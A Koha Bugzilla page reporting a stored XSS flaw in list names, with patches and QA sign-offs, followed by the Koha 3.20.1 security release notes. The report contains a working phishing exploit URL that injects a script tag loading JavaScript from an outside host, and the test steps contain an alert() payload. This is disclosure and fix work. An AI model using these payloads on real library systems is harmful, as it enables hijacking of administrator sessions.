=== Content from bugs.koha-community.org_f4fd86b2_20250125_001421.html ===


Bugzilla – Bug 14416
Stored XSS flaw affects OPAC and Staff interface
Last modified: 2017-06-14 22:11:54 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=14416&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=14416&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 14416**](show_bug.cgi?id=14416)
- Stored XSS flaw affects OPAC and Staff interface

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Stored XSS flaw affects OPAC and Staff interface

| | [Status](page.cgi?id=fields.html#bug_status): | CLOSED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Koha | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Koha "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Lists ([show other bugs](buglist.cgi?component=Lists&product=Koha&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P5 - low major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Galen Charlton | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Testopia | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | Duplicates (1): | [14415](show_bug.cgi?id=14415 "RESOLVED DUPLICATE")  ([view as bug list](buglist.cgi?bug_id=14415)) | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [13618](show_bug.cgi?id=13618 "CLOSED FIXED - Add additional template filter methods and a filter presence test to Koha") [14568](show_bug.cgi?id=14568 "CLOSED FIXED") | |  | Show dependency [tree](showdependencytree.cgi?id=14416&hide_resolved=1) / [graph](showdependencygraph.cgi?id=14416) | |  | | Reported: | 2015-06-18 18:18 UTC by Raschin Tavakoli | | --- | --- | | Modified: | 2017-06-14 22:11 UTC ([History](show_activity.cgi?id=14416)) | | CC List: | 10 users (show)  chris fridolin.somers jonathan.druart liz m.de.rooy martin.renvoize mtj RGhanad-Tavakoli robin tomascohen | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Change sponsored?:](page.cgi?id=fields.html#cf_sponsorship "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Patch complexity:](page.cgi?id=fields.html#cf_patch_complexity "A custom Drop Down field in this installation of Bugzilla.") | Small patch | | [Documentation contact:](page.cgi?id=fields.html#cf_docs_contact "The person taking responsibility for documenting the change introduced in this bug.") |  | | [Documentation submission:](page.cgi?id=fields.html#cf_manual "gitlab merge request url for this documentation submission") |  | | [Text to go in the release notes:](page.cgi?id=fields.html#cf_release_notes "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Version(s) released in:](page.cgi?id=fields.html#cf_release_version "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Circulation function:](page.cgi?id=fields.html#cf_circulation_subcomponent "A custom Multiple-Selection Box field in this installation of Bugzilla.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Screenshots with Exploit Scenario**](attachment.cgi?id=40333 "View the content of the attachment") (811.36 KB, application/x-compressed-tar)  [2015-06-18 18:40 UTC](#attach_40333 "Go to the comment associated with the attachment"), Raschin Tavakoli | [Details](attachment.cgi?id=40333&action=edit) | | [**Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40340 "View the content of the attachment") (2.05 KB, patch)  [2015-06-18 23:03 UTC](#attach_40340 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40340&action=edit) | [Diff](attachment.cgi?id=40340&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40340) | | [**Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40341 "View the content of the attachment") (2.38 KB, patch)  [2015-06-18 23:28 UTC](#attach_40341 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40341&action=edit) | [Diff](attachment.cgi?id=40341&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40341) | | [**Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40353 "View the content of the attachment") (2.11 KB, patch)  [2015-06-19 09:22 UTC](#attach_40353 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40353&action=edit) | [Diff](attachment.cgi?id=40353&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40353) | | [**Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40354 "View the content of the attachment") (2.45 KB, patch)  [2015-06-19 09:23 UTC](#attach_40354 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40354&action=edit) | [Diff](attachment.cgi?id=40354&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40354) | | [**Bug 14416: (follow-up) opac addbybilionumber**](attachment.cgi?id=40355 "View the content of the attachment") (1.66 KB, patch)  [2015-06-19 09:23 UTC](#attach_40355 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40355&action=edit) | [Diff](attachment.cgi?id=40355&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40355) | | [**Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)**](attachment.cgi?id=40356 "View the content of the attachment") (2.28 KB, patch)  [2015-06-19 09:23 UTC](#attach_40356 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40356&action=edit) | [Diff](attachment.cgi?id=40356&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40356) | | [**[PASSED QA] Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40370 "View the content of the attachment") (2.18 KB, patch)  [2015-06-19 13:27 UTC](#attach_40370 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40370&action=edit) | [Diff](attachment.cgi?id=40370&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40370) | | [**[PASSED QA] Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40371 "View the content of the attachment") (2.52 KB, patch)  [2015-06-19 13:28 UTC](#attach_40371 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40371&action=edit) | [Diff](attachment.cgi?id=40371&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40371) | | [**[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber**](attachment.cgi?id=40372 "View the content of the attachment") (1.73 KB, patch)  [2015-06-19 13:29 UTC](#attach_40372 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40372&action=edit) | [Diff](attachment.cgi?id=40372&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40372) | | [**[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)**](attachment.cgi?id=40373 "View the content of the attachment") (2.35 KB, patch)  [2015-06-19 13:29 UTC](#attach_40373 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40373&action=edit) | [Diff](attachment.cgi?id=40373&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40373) | | [Show Obsolete](#a0) (6) [View All](attachment.cgi?bugid=14416&action=viewall&hide_obsolete=1)  [Add an attachment](attachment.cgi?bugid=14416&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=14416&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=14416#c0)  Raschin Tavakoli    2015-06-18 18:18:40 UTC  ``` We found a Stored XSS flaw in the Koha Library which could allow remote attackers to execute arbritrary code via XSRF.  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>   Example Scenario:  Student Alice receives a phishing mail and clicks the following:  /cgi-bin/koha/opac-shelves.pl?shelves=1&addshelf=Malicious+Input+%3Cscript+src%3D%27http%3A%2F%2Fcst.sba-research.org%2Fx.js%27%2F%3E&owner=7854&sortfield=title&category=2&allow_add=0&allow_delete_own=1&allow_delete_other=0  Bob, library admin, recognizes the new malicious list entry. He logs into the staff area and browses the public lists in order to delete the entry. Once he opens   <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  the malcious code get's executed. It then could either target bob's browser or even perform an XSRF attack by exploiting other server-side vulnerabilities.  Side note:  In order to make the attack work, alice only needs to have access to the OPAC interface and to have permissions to create public lists. ---  Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research. Contact: cst@sba-research.org ```  [Comment 1](show_bug.cgi?id=14416#c1)  Raschin Tavakoli    2015-06-18 18:40:30 UTC  ``` Created [attachment 40333](attachment.cgi?id=40333 "Screenshots with Exploit Scenario") [[details]](attachment.cgi?id=40333&action=edit "Screenshots with Exploit Scenario") Screenshots with Exploit Scenario  The screenshots show the input in the OPAC interface (victim1 - alice), the target victim in the Staff client (bob), and the permissions page of alice and bob.  As we can see, alice, has very restricted permissions various bob has superlibrarian permissions set. ```  [Comment 2](show_bug.cgi?id=14416#c2)  Chris Cormack    2015-06-18 18:55:01 UTC  ``` *** [Bug 14415](show_bug.cgi?id=14415 "RESOLVED DUPLICATE") has been marked as a duplicate of this bug. *** ```   [Comment 3](show_bug.cgi?id=14416#c3)  Chris Cormack    2015-06-18 23:03:55 UTC  Comment hidden (obsolete)  ``` Created [attachment 40340](attachment.cgi?id=40340&action=diff "Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40340&action=edit "Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40340) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit ```   [Comment 4](show_bug.cgi?id=14416#c4)  Chris Cormack    2015-06-18 23:28:02 UTC  Comment hidden (obsolete)  ``` Created [attachment 40341](attachment.cgi?id=40341&action=diff "Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40341&action=edit "Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40341) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again ```   [Comment 5](show_bug.cgi?id=14416#c5)  Jonathan Druart    2015-06-19 09:22:56 UTC  Comment hidden (obsolete)  ``` Created [attachment 40353](attachment.cgi?id=40353&action=diff "Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40353&action=edit "Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40353) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 6](show_bug.cgi?id=14416#c6)  Jonathan Druart    2015-06-19 09:23:03 UTC  Comment hidden (obsolete)  ``` Created [attachment 40354](attachment.cgi?id=40354&action=diff "Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40354&action=edit "Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40354) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 7](show_bug.cgi?id=14416#c7)  Jonathan Druart    2015-06-19 09:23:06 UTC  Comment hidden (obsolete)  ``` Created [attachment 40355](attachment.cgi?id=40355&action=diff "Bug 14416: (follow-up) opac addbybilionumber") [[details]](attachment.cgi?id=40355&action=edit "Bug 14416: (follow-up) opac addbybilionumber") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40355) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): (follow-up) opac addbybilionumber  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 8](show_bug.cgi?id=14416#c8)  Jonathan Druart    2015-06-19 09:23:10 UTC  Comment hidden (obsolete)  ``` Created [attachment 40356](attachment.cgi?id=40356&action=diff "Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[details]](attachment.cgi?id=40356&action=edit "Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40356) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): Stored XSS vulnerability - add biblio to shelf (intranet)  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```  [Comment 9](show_bug.cgi?id=14416#c9)  Jonathan Druart    2015-06-19 09:23:57 UTC  ``` Found 2 more at the OPAC and I submitted a patch for the intranet side (which was affected too). ```  [Comment 10](show_bug.cgi?id=14416#c10)  Jonathan Druart    2015-06-19 09:25:38 UTC  ``` if ( $var =~ m|<script>| ) {     $template->param( error => "CONVOKE_STUDENT" ); }  :) ```  [Comment 11](show_bug.cgi?id=14416#c11)  Katrin Fischer    2015-06-19 13:27:26 UTC  ``` Created [attachment 40370](attachment.cgi?id=40370&action=diff "[PASSED QA] Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40370&action=edit "[PASSED QA] Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40370) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 12](show_bug.cgi?id=14416#c12)  Katrin Fischer    2015-06-19 13:28:45 UTC  ``` Created [attachment 40371](attachment.cgi?id=40371&action=diff "[PASSED QA] Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40371&action=edit "[PASSED QA] Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40371) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 13](show_bug.cgi?id=14416#c13)  Katrin Fischer    2015-06-19 13:29:11 UTC  ``` Created [attachment 40372](attachment.cgi?id=40372&action=diff "[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber") [[details]](attachment.cgi?id=40372&action=edit "[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40372) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): (follow-up) opac addbybilionumber  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 14](show_bug.cgi?id=14416#c14)  Katrin Fischer    2015-06-19 13:29:35 UTC  ``` Created [attachment 40373](attachment.cgi?id=40373&action=diff "[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[details]](attachment.cgi?id=40373&action=edit "[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40373) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): Stored XSS vulnerability - add biblio to shelf (intranet)  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 15](show_bug.cgi?id=14416#c15)  Tomás Cohen Arazi (tcohen)    2015-06-22 14:39:06 UTC  ``` Patches pushed to master. Good job Chris! ```  [Comment 16](show_bug.cgi?id=14416#c16)  Chris Cormack    2015-06-22 21:42:49 UTC  ``` Pushed to 3.20.x will be in 3.20.1 ```  [Comment 17](show_bug.cgi?id=14416#c17)  Fridolin Somers    2015-06-23 09:27:15 UTC  ``` Pushed to 3.14.x, will be in 3.14.16 ```  [Comment 18](show_bug.cgi?id=14416#c18)  Mason James    2015-06-23 14:03:24 UTC  ``` Pushed to 3.16.x, will be in 3.16.12 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=14416)
* - [XML](show_bug.cgi?ctype=xml&id=14416)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=14416)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=14416&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=14416&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from koha-community.org_e608977c_20250125_001422.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Security Release – Koha 3.20.1

[Chris Cormack](https://koha-community.org/author/rangi/ "View all posts by Chris Cormack")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/security-release-koha-3-20-1/ "Security Release – Koha 3.20.1")
Posted in [3.20](https://koha-community.org/category/release/3-20/)

The Koha release team would like to announce the release of Koha 3.20.1, this is a security and a bugfix release.

As such we strongly recommend people running 3.20.0 should upgrade as soon as possible

Special thanks also goes to Raschin Tavakoli and Dimitris Simos from the Combinatorial Security Testing Team of SBA Research for finding and reporting the security bugs.

Please continue reading for the full release notes

```
RELEASE NOTES FOR KOHA 3.20.1
23 Jun 2015
========================================================================

Koha is the first free and open source software library automation package
(ILS). Development is sponsored by libraries of varying types and sizes,
volunteers, and support companies from around the world.
The website for the Koha project is
> [Home](https://koha-community.org/)

Koha 3.20.1 can be downloaded from:

    http://download.koha-community.org/koha-3.20.01.tar.gz

Installation instructions can be found at:

    http://wiki.koha-community.org/wiki/Installation_Documentation

    OR in the INSTALL files that come in the tarball

Koha 3.20.1 is a Security and bugfix/maintenance release.

Security fixes in 3.20.1
======================

Lists
----------
	14416	major	Stored XSS flaw affects OPAC and Staff interface

OPAC
----------
	14412	critical	SQL Injection in OPAC Interface
	14360	major	XSS Injection point
	14418	major	XSS Flaws in OPAC Interface

Staff Client
----------
	14408	critical	Path traversal vulnerabilty
	14426	critical	SQL Injection in Staff Client
	14423	major	Multiple XSS and XSRF issues in Staff Client

Critical bugs fixed in 3.20.1
======================

Circulation
----------
	12066	major	New renew page in staff client doesn't record branch in statistics

Tools
----------
	10625	major	Inventory/Stocktaking tool cannot handle windows file uploads

Other bugs fixed in 3.20.1
======================

Architecture, internals, and plumbing
----------
	5010	normal	Fix OPACBaseURL to include protocol
	12320	normal	$.cookie('foo', null) deprecated
	13265	normal	Still too many search cursor cookies
	13815	normal	Plack loose CGI qw(-utf8) flag creating incorrect utf-8 encoding everywhere
	14351	normal	Remove given-when from opac-search.pl
	11790	minor	C4::Charset should not depend on C4::Context
	14325	minor	Test calls C4::Context::set_userenv
	14344	minor	Uninitialized value warning C4/Utils/DataTables/Members.pm

Cataloging
----------
	14047	normal	Sort z39.50 biblio servers by rank in derivate cataloguing doesn't work
	14276	minor	Keep highlight on the active item in item editor
	14327	minor	Fix js error "TypeError: events is null" in additem.js

Circulation
----------
	14299	normal	Today's checkouts not always sorting correctly

Command-line Utilities
----------
	14203	trivial	Koha-translate error string for non-existent lang removal

Database
----------
	14350	minor	Missing statement in kohastructure.sql - DROP TABLE IF EXISTS borrower_sync;

Hold requests
----------
	14142	minor	Holds queue viewer only displays first subtitle from marc keyword mappings

I18N/L10N
----------
	13656	normal	"Change"/"Set to patron" button for linking a member to an organisation (or child to guarantor) not translatable
	14263	normal	Export of CSV from item search form does only work in English

Notices
----------
	14206	normal	Notices using non email templates can't be deleted from the staff client

OPAC
----------
	14173	normal	Paging on 'recent comments' page in OPAC is not displaying correctly
	14313	normal	OPAC: Adding a comment makes result browser disappear
	14025	minor	Fix 856u-links in the OPAC for NORMARC
	14184	minor	Noisy warns in C4/CourseReserves.pm
	14185	minor	Noisy warns in opac-readingrecord.pl
	14186	minor	Noisy warns in opac-reserve.pl
	14269	minor	OPAC: Small template improvements to full serial history page

Patrons
----------
	9314	normal	Remove useless code related to the type_only parameter
	13970	normal	Remove related code to category_type
	14338	normal	Unable to delete patron images
	11929	minor	Patron modification error shows borrowernumber
	11941	minor	"Patron lists" are not easily accessible

Reports
----------
	14130	normal	Column.def should be updated with descriptions for new columns

Serials
----------
	13662	normal	Serial permissions: receive_serials

System Administration
----------
	14291	minor	OpacExportOptions shouldn't say 'separated by |'
	14314	trivial	System Preferences: Better explanation for syspref 'ShowReviewerPhoto'

Templates
----------
	14265	normal	Use $.trim instead of trim() in admin/categorie.tt
	14266	normal	Replace trim() with $.trim() in opac-shareshelf.tt
	14279	normal	Remove CGI::scrolling_list from issues_avg_stats.pl
	12176	minor	Remove HTML from additem.pl
	13946	minor	Change order status 'Pending' to ordered like in database
	14267	minor	How active is active in additem.tt?
	14275	minor	Remove CGI::scrolling_list from guided_reports.pl
